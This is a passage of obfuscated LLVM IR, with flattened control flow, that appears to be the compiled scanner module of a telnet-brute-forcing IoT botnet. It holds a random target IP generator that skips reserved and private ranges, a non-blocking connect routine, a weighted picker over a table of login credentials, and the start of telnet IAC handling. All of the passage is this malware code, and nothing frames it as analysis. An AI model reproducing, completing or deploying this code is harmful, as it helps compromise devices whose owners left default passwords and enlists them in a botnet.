  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 15
  %42 = select i1 %41, i32 -1579299619, i32 -1888424889
  store i32 %42, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i8, i8* %2, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp eq i32 %45, 16
  %47 = select i1 %46, i32 -1579299619, i32 2040977284
  store i32 %47, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8, i8* %2, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 56
  %52 = select i1 %51, i32 -1579299619, i32 1785456923
  store i32 %52, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i8, i8* %2, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp eq i32 %55, 10
  %57 = select i1 %56, i32 -1579299619, i32 1464391366
  store i32 %57, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8, i8* %2, align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 192
  %62 = select i1 %61, i32 1365170906, i32 1011289696
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8, i8* %3, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 168
  %67 = select i1 %66, i32 -1579299619, i32 1011289696
  store i32 %67, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8, i8* %2, align 1
  %70 = zext i8 %69 to i32
  %71 = icmp eq i32 %70, 172
  %72 = select i1 %71, i32 1395002208, i32 156181057
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i8, i8* %3, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp sge i32 %75, 16
  %77 = select i1 %76, i32 319205947, i32 156181057
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8, i8* %3, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp slt i32 %80, 32
  %82 = select i1 %81, i32 -1579299619, i32 156181057
  store i32 %82, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  %84 = load i8, i8* %2, align 1
  %85 = zext i8 %84 to i32
  %86 = icmp eq i32 %85, 100
  %87 = select i1 %86, i32 103078918, i32 -1424653634
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i8, i8* %3, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp sge i32 %90, 64
  %92 = select i1 %91, i32 -1129412846, i32 -1424653634
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8, i8* %3, align 1
  %95 = zext i8 %94 to i32
  %96 = icmp slt i32 %95, 127
  %97 = select i1 %96, i32 -1579299619, i32 -1424653634
  store i32 %97, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i8, i8* %2, align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 169
  %102 = select i1 %101, i32 -480210197, i32 -375615131
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8, i8* %3, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp sgt i32 %105, 254
  %107 = select i1 %106, i32 -1579299619, i32 -375615131
  store i32 %107, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = load i8, i8* %2, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 198
  %112 = select i1 %111, i32 1495693000, i32 1487241361
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i8, i8* %3, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp sge i32 %115, 18
  %117 = select i1 %116, i32 -1979237151, i32 1487241361
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i8, i8* %3, align 1
  %120 = zext i8 %119 to i32
  %121 = icmp slt i32 %120, 20
  %122 = select i1 %121, i32 -1579299619, i32 1487241361
  store i32 %122, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i8, i8* %2, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp sge i32 %125, 224
  %127 = select i1 %126, i32 -1579299619, i32 1713188423
  store i32 %127, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load i8, i8* %2, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 106
  %132 = select i1 %131, i32 -1650706473, i32 -1652592031
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i8, i8* %3, align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 186
  %137 = select i1 %136, i32 -1579299619, i32 -1652592031
  store i32 %137, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:138:                                    ; preds = %loopEntry
  %139 = load i8, i8* %2, align 1
  %140 = zext i8 %139 to i32
  %141 = icmp eq i32 %140, 106
  %142 = select i1 %141, i32 2134371038, i32 385596256
  store i32 %142, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load i8, i8* %3, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 187
  %147 = select i1 %146, i32 -1579299619, i32 385596256
  store i32 %147, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i8, i8* %2, align 1
  %150 = zext i8 %149 to i32
  %151 = icmp eq i32 %150, 106
  %152 = select i1 %151, i32 -589051870, i32 1379180950
  store i32 %152, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load i8, i8* %3, align 1
  %155 = zext i8 %154 to i32
  %156 = icmp eq i32 %155, 185
  %157 = select i1 %156, i32 -1579299619, i32 1379180950
  store i32 %157, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8, i8* %2, align 1
  %160 = zext i8 %159 to i32
  %161 = icmp eq i32 %160, 106
  %162 = select i1 %161, i32 970279813, i32 1146300362
  store i32 %162, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = load i8, i8* %3, align 1
  %165 = zext i8 %164 to i32
  %166 = icmp eq i32 %165, 184
  %167 = select i1 %166, i32 -1579299619, i32 1146300362
  store i32 %167, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i8, i8* %2, align 1
  %170 = zext i8 %169 to i32
  %171 = icmp eq i32 %170, 150
  %172 = select i1 %171, i32 712371570, i32 209685172
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load i8, i8* %3, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp eq i32 %175, 31
  %177 = select i1 %176, i32 -1579299619, i32 209685172
  store i32 %177, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = load i8, i8* %2, align 1
  %180 = zext i8 %179 to i32
  %181 = icmp eq i32 %180, 49
  %182 = select i1 %181, i32 -1646251723, i32 -1397873387
  store i32 %182, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i8, i8* %3, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp eq i32 %185, 51
  %187 = select i1 %186, i32 -1579299619, i32 -1397873387
  store i32 %187, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i8, i8* %2, align 1
  %190 = zext i8 %189 to i32
  %191 = icmp eq i32 %190, 178
  %192 = select i1 %191, i32 1074400867, i32 251173379
  store i32 %192, i32* %switchVar
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  %194 = load i8, i8* %3, align 1
  %195 = zext i8 %194 to i32
  %196 = icmp eq i32 %195, 62
  %197 = select i1 %196, i32 -1579299619, i32 251173379
  store i32 %197, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  %199 = load i8, i8* %2, align 1
  %200 = zext i8 %199 to i32
  %201 = icmp eq i32 %200, 160
  %202 = select i1 %201, i32 43505548, i32 586411158
  store i32 %202, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load i8, i8* %3, align 1
  %205 = zext i8 %204 to i32
  %206 = icmp eq i32 %205, 13
  %207 = select i1 %206, i32 -1579299619, i32 586411158
  store i32 %207, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load i8, i8* %2, align 1
  %210 = zext i8 %209 to i32
  %211 = icmp eq i32 %210, 6
  %212 = select i1 %211, i32 1009654242, i32 -1082729019
  store i32 %212, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = load i8, i8* %2, align 1
  %215 = zext i8 %214 to i32
  %216 = icmp eq i32 %215, 7
  %217 = select i1 %216, i32 1009654242, i32 -609513478
  store i32 %217, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i8, i8* %2, align 1
  %220 = zext i8 %219 to i32
  %221 = icmp eq i32 %220, 11
  %222 = select i1 %221, i32 1009654242, i32 -1536602322
  store i32 %222, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = load i8, i8* %2, align 1
  %225 = zext i8 %224 to i32
  %226 = icmp eq i32 %225, 21
  %227 = select i1 %226, i32 1009654242, i32 -513218937
  store i32 %227, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %229 = load i8, i8* %2, align 1
  %230 = zext i8 %229 to i32
  %231 = icmp eq i32 %230, 22
  %232 = select i1 %231, i32 1009654242, i32 1621724471
  store i32 %232, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i8, i8* %2, align 1
  %235 = zext i8 %234 to i32
  %236 = icmp eq i32 %235, 26
  %237 = select i1 %236, i32 1009654242, i32 -1934847558
  store i32 %237, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = load i8, i8* %2, align 1
  %240 = zext i8 %239 to i32
  %241 = icmp eq i32 %240, 28
  %242 = select i1 %241, i32 1009654242, i32 -1631280444
  store i32 %242, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %244 = load i8, i8* %2, align 1
  %245 = zext i8 %244 to i32
  %246 = icmp eq i32 %245, 29
  %247 = select i1 %246, i32 1009654242, i32 454417882
  store i32 %247, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = load i8, i8* %2, align 1
  %250 = zext i8 %249 to i32
  %251 = icmp eq i32 %250, 30
  %252 = select i1 %251, i32 1009654242, i32 -1993067376
  store i32 %252, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = load i8, i8* %2, align 1
  %255 = zext i8 %254 to i32
  %256 = icmp eq i32 %255, 33
  %257 = select i1 %256, i32 1009654242, i32 -94866011
  store i32 %257, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = load i8, i8* %2, align 1
  %260 = zext i8 %259 to i32
  %261 = icmp eq i32 %260, 55
  %262 = select i1 %261, i32 1009654242, i32 553613521
  store i32 %262, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i8, i8* %2, align 1
  %265 = zext i8 %264 to i32
  %266 = icmp eq i32 %265, 214
  %267 = select i1 %266, i32 1009654242, i32 916761350
  store i32 %267, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %269 = load i8, i8* %2, align 1
  %270 = zext i8 %269 to i32
  %271 = icmp eq i32 %270, 215
  store i32 1009654242, i32* %switchVar
  store i1 %271, i1* %.reg2mem
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -1579299619, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %274 = select i1 %.reload3, i32 622199045, i32 943692013
  store i32 %274, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = load i8, i8* %2, align 1
  %277 = zext i8 %276 to i32
  %278 = shl i32 %277, 24
  %279 = load i8, i8* %3, align 1
  %280 = zext i8 %279 to i32
  %281 = shl i32 %280, 16
  %282 = or i32 %278, %281
  %283 = load i8, i8* %4, align 1
  %284 = zext i8 %283 to i32
  %285 = shl i32 %284, 8
  %286 = or i32 %282, %285
  %287 = load i8, i8* %5, align 1
  %288 = zext i8 %287 to i32
  %289 = shl i32 %288, 0
  %290 = or i32 %286, %289
  %291 = call i32 @htonl(i32 %290) #7
  ret i32 %291

loopEnd:                                          ; preds = %273, %272, %268, %263, %258, %253, %248, %243, %238, %233, %228, %223, %218, %213, %208, %203, %198, %193, %188, %183, %178, %173, %168, %163, %158, %153, %148, %143, %138, %133, %128, %123, %118, %113, %108, %103, %98, %93, %88, %83, %78, %73, %68, %63, %58, %53, %48, %43, %38, %33, %28, %23, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @setup_connection(%struct.scanner_connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 1
  %8 = load i32, i32* %7, align 8
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1287371888, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1287371888, label %first
    i32 2072872388, label %11
    i32 -1770155263, label %16
    i32 1102373766, label %22
    i32 -1073232773, label %23
    i32 -313185261, label %61
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %9 = icmp ne i32 %.reload, -1
  %10 = select i1 %9, i32 2072872388, i32 -1770155263
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %13 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %12, i32 0, i32 1
  %14 = load i32, i32* %13, align 8
  %15 = call i32 @close(i32 %14)
  store i32 -1770155263, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %18 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i32 0, i32 1
  store i32 %17, i32* %19, align 8
  %20 = icmp eq i32 %17, -1
  %21 = select i1 %20, i32 1102373766, i32 -1073232773
  store i32 %21, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 -313185261, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 6
  store i32 0, i32* %25, align 4
  %26 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %26, i32 0, i32 7
  %28 = getelementptr inbounds [256 x i8], [256 x i8]* %27, i32 0, i32 0
  call void @util_zero(i8* %28, i32 256)
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 8
  %32 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %33 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %32, i32 0, i32 1
  %34 = load i32, i32* %33, align 8
  %35 = call i32 (i32, i32, ...) @fcntl(i32 %34, i32 3, i32 0)
  %36 = or i32 2048, %35
  %37 = call i32 (i32, i32, ...) @fcntl(i32 %31, i32 4, i32 %36)
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %38, align 4
  %39 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %39, i32 0, i32 4
  %41 = load i32, i32* %40, align 4
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %43 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %42, i32 0, i32 0
  store i32 %41, i32* %43, align 4
  %44 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %45 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %44, i32 0, i32 5
  %46 = load i16, i16* %45, align 8
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %46, i16* %47, align 2
  %48 = load i32, i32* @fake_time, align 4
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 2
  store i32 %48, i32* %50, align 4
  %51 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %52 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %51, i32 0, i32 3
  store i32 1, i32* %52, align 8
  %53 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %54 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %53, i32 0, i32 1
  %55 = load i32, i32* %54, align 8
  %56 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %57 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %57, %struct.sockaddr** %56, align 8
  %58 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %59 = load %struct.sockaddr*, %struct.sockaddr** %58, align 8
  %60 = call i32 @connect(i32 %55, %struct.sockaddr* %59, i32 16)
  store i32 -313185261, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %23, %22, %16, %11, %first, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.fd_set.28*, %struct.fd_set.28*, %struct.fd_set.28*, %struct.timeval.29*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = alloca %struct.scanner_auth*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i16, align 2
  %4 = call i32 @rand_next()
  %5 = load i16, i16* @auth_table_max_weight, align 2
  %6 = zext i16 %5 to i32
  %7 = urem i32 %4, %6
  %8 = trunc i32 %7 to i16
  store i16 %8, i16* %3, align 2
  store i32 0, i32* %2, align 4
  %switchVar = alloca i32
  store i32 -999114482, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -999114482, label %9
    i32 -2116766497, label %14
    i32 -2064897146, label %26
    i32 -1853989720, label %27
    i32 -125615786, label %39
    i32 2039968264, label %44
    i32 -575828298, label %45
    i32 -1406892890, label %46
    i32 1702307885, label %49
    i32 -1058662685, label %50
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  %11 = load i32, i32* @auth_table_len, align 4
  %12 = icmp slt i32 %10, %11
  %13 = select i1 %12, i32 -2116766497, i32 1702307885
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i16, i16* %3, align 2
  %16 = zext i16 %15 to i32
  %17 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %18 = load i32, i32* %2, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %17, i64 %19
  %21 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %20, i32 0, i32 2
  %22 = load i16, i16* %21, align 8
  %23 = zext i16 %22 to i32
  %24 = icmp slt i32 %16, %23
  %25 = select i1 %24, i32 -2064897146, i32 -1853989720
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i32 -1406892890, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i16, i16* %3, align 2
  %29 = zext i16 %28 to i32
  %30 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %31 = load i32, i32* %2, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %30, i64 %32
  %34 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %33, i32 0, i32 3
  %35 = load i16, i16* %34, align 2
  %36 = zext i16 %35 to i32
  %37 = icmp slt i32 %29, %36
  %38 = select i1 %37, i32 -125615786, i32 2039968264
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %41 = load i32, i32* %2, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %40, i64 %42
  store %struct.scanner_auth* %43, %struct.scanner_auth** %1, align 8
  store i32 -1058662685, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 -575828298, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 -1406892890, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %2, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %2, align 4
  store i32 -999114482, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store %struct.scanner_auth* null, %struct.scanner_auth** %1, align 8
  store i32 -1058662685, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load %struct.scanner_auth*, %struct.scanner_auth** %1, align 8
  ret %struct.scanner_auth* %51

loopEnd:                                          ; preds = %49, %46, %45, %44, %39, %27, %26, %14, %9, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 601831156, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 601831156, label %first
    i32 1249234242, label %21
    i32 -1774151737, label %22
    i32 -1613293766, label %27
    i32 -270273334, label %36
    i32 -808541765, label %41
    i32 -1005168455, label %42
    i32 71423095, label %45
    i32 1713508924, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %19 = icmp sgt i32 %.reload, 0
  %20 = select i1 %19, i32 1249234242, i32 1713508924
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  store i32 -1774151737, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %10, align 4
  %24 = load i32, i32* %9, align 4
  %25 = icmp slt i32 %23, %24
  %26 = select i1 %25, i32 -1613293766, i32 71423095
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %33, 0
  %35 = select i1 %34, i32 -270273334, i32 -808541765
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i8*, i8** %6, align 8
  %38 = load i32, i32* %10, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %37, i64 %39
  store i8 65, i8* %40, align 1
  store i32 -808541765, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  store i32 -1005168455, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %10, align 4
  store i32 -1774151737, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 1713508924, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %9, align 4
  ret i32 %47

loopEnd:                                          ; preds = %45, %42, %41, %36, %27, %22, %21, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_iacs(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  %switchVar = alloca i32
  store i32 1418348082, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1418348082, label %11
    i32 -333949193, label %18
    i32 -233049431, label %24
    i32 -1579045, label %25
    i32 166360983, label %31
    i32 -1546514631, label %37
    i32 692194876, label %38
    i32 -1230500736, label %45
    i32 767910832, label %50
    i32 213508688, label %57
    i32 866363524, label %65
    i32 -1426995499, label %66
    i32 -553775961, label %73
    i32 -198887827, label %74
    i32 1687484170, label %89
    i32 -277811787, label %90
    i32 955859749, label %96
    i32 -1850757325, label %97
    i32 710150760, label %98
    i32 145885371, label %102
    i32 1847672382, label %111
    i32 -1784932631, label %116
